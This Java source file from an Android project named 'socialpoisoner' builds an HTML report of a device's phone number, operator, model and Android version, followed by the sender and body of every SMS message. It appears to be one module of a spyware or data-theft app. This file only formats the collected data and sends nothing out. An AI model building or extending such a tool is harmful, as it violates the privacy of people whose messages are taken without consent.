package com.cakeman.doctorrabb.socialpoisoner.modules;

import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by doctorrabb on 16.07.16.
 */

public class messageBuilder {

    private JSONObject jsonObject;

    public messageBuilder (JSONObject jsonObject) {
        this.jsonObject = jsonObject;
    }

    public String buildToHtml () {
        String html = "<h1>Device Information</h1><img src='https://lh3.ggpht.com/04DjMWrG_qAyMBj_sMi4AlQgR5nHZAc_H9r7DwXU5MyH35mpUjHQZVYB0ylQJ9o7Qf4=w300'>";

        try {
            JSONObject info = this.jsonObject.getJSONObject ("info");
            html += "<br><h2>Phone Number: " + info.getString ("phone_number") + "</h2>";
            html += "<br><h2>Mobile Operator: " + info.getString ("mobile_operator") + "</h2>";
            html += "<br><h2>Device Model: " + info.getString ("device_model") + "</h2>";
            html += "<br><h2>Android Version: " + info.getString ("android_version") + "</h2>";
            html += "<br><h2>Android Version Codename: " + info.getString ("android_version_codename") + "</h2>";

        } catch (JSONException e) {
           Log.e ("!", "NO INFO");
        }

        html += "<br><br><br><h1>SMS Data</h1>";

        try {
            for (int i = 0; i < this.jsonObject.getJSONArray ("sms").length(); i++) {
                html += "<br><h2>" + this.jsonObject.getJSONArray ("sms").getJSONObject (i).getString ("address") + "</h2><br><h3>" + this.jsonObject.getJSONArray ("sms").getJSONObject (i).getString ("body") + "</h3>";
            }
        } catch (Exception e) {
            Log.e ("To Json Error!", e.getMessage());
        }

        return html;
    }

}
